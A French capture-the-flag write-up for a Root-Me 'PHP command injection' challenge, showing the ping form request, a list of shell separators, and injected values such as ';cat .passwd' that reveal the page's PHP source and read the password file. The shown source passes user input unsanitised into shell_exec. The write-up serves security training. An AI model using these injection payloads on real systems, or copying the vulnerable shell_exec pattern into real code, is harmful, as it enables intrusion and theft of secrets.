# PHP - Injection de commande

## Enoncé

```
Détournez l’usage premier de ce service.

Note : le mot de passe de validation est dans index.php.
```

## Procédure

1. Analyse du code source + test

Il y a une balise input avec en placeholder "127.0.0.1" et un input envoyer.<br>
Je fais ce qui est indiquer est un fichier index.php est chargé avec les résultats d'une requête ping vers 127.0.0.1.

Header : 

```
POST /web-serveur/ch54/index.php HTTP/1.1
Host: challenge01.root-me.org
Content-Length: 12
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge01.root-me.org/web-serveur/ch54/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

ip=127.0.0.1
```


Réponse : 

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.072 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.090 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.052 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2036ms
rtt min/avg/max/mdev = 0.052/0.071/0.090/0.015 ms
```

2. Utilisation de caractères échappatoire en bash

Petit liste pour exemple : 

```
;
|
&
||
&&
```

3. Exploitation

```
;php -s index.php

<?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
```

Le flag se trouve donc dans le fichier .passwd

```
;cat .passwd
S3rXXXXXXXXXXXure
```